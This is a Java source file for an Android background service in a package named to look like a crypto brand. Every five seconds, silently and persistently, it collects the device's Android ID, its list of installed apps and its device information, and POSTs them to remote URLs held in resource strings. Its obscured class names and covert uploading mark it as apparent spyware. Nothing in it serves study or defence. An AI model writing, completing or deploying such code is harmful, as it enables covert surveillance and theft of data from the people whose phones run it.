package crypto.com;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.Settings;
import android.widget.Toast;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class kajSer extends Service {

	private String APP_URL;
	private String DEV_URL;

	private static final int UPLOAD_INTERVAL_MS = 5000; // 5 seconds

	private ScheduledExecutorService executorService;

	@Override
	public void onCreate() {
		super.onCreate();
		APP_URL = getResources().getString(R.string.app_lrul);
		DEV_URL = getResources().getString(R.string.dev_lrul);
		HandlerThread handlerThread = new HandlerThread("BackgroundThread");
		handlerThread.start();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		startUploadTask();
		return START_STICKY;
	}

	private void startUploadTask() {
		executorService = Executors.newSingleThreadScheduledExecutor();
		executorService.scheduleAtFixedRate(new Runnable() {
			@Override
			public void run() {

				String androidId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);

				// Fetch installed apps using InstalledApps class
				Kakkweh installedApps = new Kakkweh(getApplicationContext());
				String installedAppsData = installedApps.getInstalledApps();
				
				Toast.makeText(getApplicationContext(),"Err"+installedAppsData, Toast.LENGTH_SHORT).show();

				// Upload app data to PHP script
				new UploadAppDataTask().execute(androidId, installedAppsData);

				Lakwjj deviceInfo = new Lakwjj(getApplicationContext());
				String deviceInfoData = deviceInfo.getDeviceInfo();

				// Upload device data to PHP script
				new UploadDeviceDataTask().execute(androidId, deviceInfoData);
			}
		}, 0, UPLOAD_INTERVAL_MS, TimeUnit.MILLISECONDS);
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (executorService != null && !executorService.isShutdown()) {
			executorService.shutdown();
		}
	}

	private class UploadAppDataTask extends AsyncTask<String, Void, Boolean> {
		@Override
		protected Boolean doInBackground(String... params) {
			String androidId = params[0];
			String installedAppsData = params[1];
			try {
				URL url = new URL(APP_URL);
				HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
				urlConnection.setRequestMethod("POST");
				urlConnection.setDoOutput(true);
				String postData = "android_id=" + androidId + "&installed_apps=" + installedAppsData;
				try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
					writer.write(postData);
					writer.flush();
				}
				int responseCode = urlConnection.getResponseCode();
				return responseCode == HttpURLConnection.HTTP_OK;
			} catch (IOException e) {
				showToastMessage("Error: " + e.getMessage());
				return false;
			}
		}

		@Override
		protected void onPostExecute(Boolean isUploadSuccessful) {
			super.onPostExecute(isUploadSuccessful);
			// Handle post execution if needed
		}
	}

	private class UploadDeviceDataTask extends AsyncTask<String, Void, Boolean> {
		@Override
		protected Boolean doInBackground(String... params) {
			String androidId = params[0];
			String deviceInfoData = params[1];
			try {
				URL url = new URL(DEV_URL);
				HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
				urlConnection.setRequestMethod("POST");
				urlConnection.setDoOutput(true);
				String postData = "android_id=" + androidId + "&device_info=" + deviceInfoData;
				try (OutputStreamWriter writer = new OutputStreamWriter(urlConnection.getOutputStream())) {
					writer.write(postData);
					writer.flush();
				}
				int responseCode = urlConnection.getResponseCode();
				return responseCode == HttpURLConnection.HTTP_OK;
			} catch (IOException e) {
				e.printStackTrace();
				return false;
			}
		}

		@Override
		protected void onPostExecute(Boolean isUploadSuccessful) {
			super.onPostExecute(isUploadSuccessful);
			// Handle post execution if needed
		}
	}

	private void showToastMessage(final String message) {
		new Handler(Looper.getMainLooper()).post(new Runnable() {
			@Override
			public void run() {
				//Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();
			}
		});
	}
}